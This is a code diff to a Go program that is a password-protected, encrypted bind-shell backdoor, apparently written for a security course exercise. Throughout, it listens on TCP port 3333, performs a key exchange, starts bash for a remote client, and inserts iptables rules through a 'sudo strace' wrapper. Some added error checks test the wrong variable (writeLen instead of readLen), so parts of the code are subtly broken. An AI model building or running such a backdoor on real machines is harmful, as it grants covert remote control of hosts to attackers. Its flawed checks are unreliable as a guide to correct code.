@@ -19,6 +19,14 @@ import (
 	"golang.org/x/crypto/hkdf"
 )
 
+const (
+	CONN_PORT    = "3333"
+	CONN_UDPPORT = "6666"
+	CONN_TYPE    = "tcp"
+	CONN_TIMEOUT = 2
+	PORT_TIMEOUT = 3
+)
+
 func seal(msg []byte, info []byte, gcm cipher.AEAD) []byte {
 	nonce := make([]byte, gcm.NonceSize())
 	rand.Read(nonce)
@@ -108,6 +116,7 @@ func handleConnection(conn net.Conn) {
 	// First packet sent by client is supposed to be a public key
 	// of length 32, and is also supposed to be on the curve
 	buf := make([]byte, 1024)
+	conn.SetDeadline(time.Now().Add(PORT_TIMEOUT * time.Second))
 	readLen, err := conn.Read(buf)
 	if err != nil || readLen != 32 {
 		println("Wrong length")
@@ -149,7 +158,11 @@ func handleConnection(conn net.Conn) {
 	}
 
 	// Check that the next message is the correct password
-	readLen, _ = conn.Read(buf)
+	readLen, err = conn.Read(buf)
+	if err != nil || writeLen != 32 {
+		fmt.Println("Unable to read from port")
+		return
+	}
 	tempBuf := buf[:readLen]
 	pt, err := open(tempBuf, info, gcm)
 	if err != nil {
@@ -162,7 +175,11 @@ func handleConnection(conn net.Conn) {
 	}
 
 	// Ack the connection, password is correct
-	conn.Write(seal([]byte("ack"), info, gcm))
+	_, err = conn.Write(seal([]byte("ack"), info, gcm))
+	if err != nil || writeLen != 32 {
+		fmt.Println("Unable to write to port")
+		return
+	}
 
 	// Start the shell
 	fmt.Println("Starting bash")
@@ -172,20 +189,14 @@ func handleConnection(conn net.Conn) {
 	stderr, _ := bash.StderrPipe()
 	bash.Start()
 
+	// No deadlines, we've established a connection with the client
+	conn.SetDeadline(time.Time{})
 	// Start thread for listening and sending
 	go errThread(stderr, conn, gcm, info[:])
 	go sendThread(stdout, conn, gcm, info[:])
 	go recvThread(stdin, conn, gcm, info[:])
 	bash.Wait()
 }
-
-const (
-	CONN_HOST    = "10.0.2.5"
-	CONN_PORT    = "3333"
-	CONN_UDPPORT = "6666"
-	CONN_TYPE    = "tcp"
-	CONN_TIMEOUT = 2
-)
 
 func openUDPRules() {
 	openInPort := exec.Command("sudo", "strace", "-o", "/dev/null", "iptables", "-I", "INPUT", "-p", "udp", "--dport", CONN_UDPPORT, "-j", "ACCEPT")
@@ -215,7 +226,28 @@ func deleteTCPRules() {
 	closeOutPort.Run()
 }
 
+// Function provided by which works pretty well for the week4 machine
+// given only one non-loopaback address
+// https://stackoverflow.com/questions/23558425/how-do-i-get-the-local-ip-address-in-go
+func GetLocalIP() string {
+	addrs, err := net.InterfaceAddrs()
+	if err != nil {
+		return ""
+	}
+	for _, address := range addrs {
+		// check the address type and if it is not a loopback the display it
+		if ipnet, ok := address.(*net.IPNet); ok && !ipnet.IP.IsLoopback() {
+			if ipnet.IP.To4() != nil {
+				return ipnet.IP.String()
+			}
+		}
+	}
+	return ""
+}
+
 func main() {
+	CONN_HOST := GetLocalIP()
+
 	// Makes sure we close iptables ports before forcefully quitting
 	c := make(chan os.Signal)
 	signal.Notify(c, os.Interrupt, syscall.SIGTERM)
@@ -251,7 +283,6 @@ func main() {
 				continue
 			}
 
-			// Handle connection
 			handleConnection(conn)
 		}
 	}()
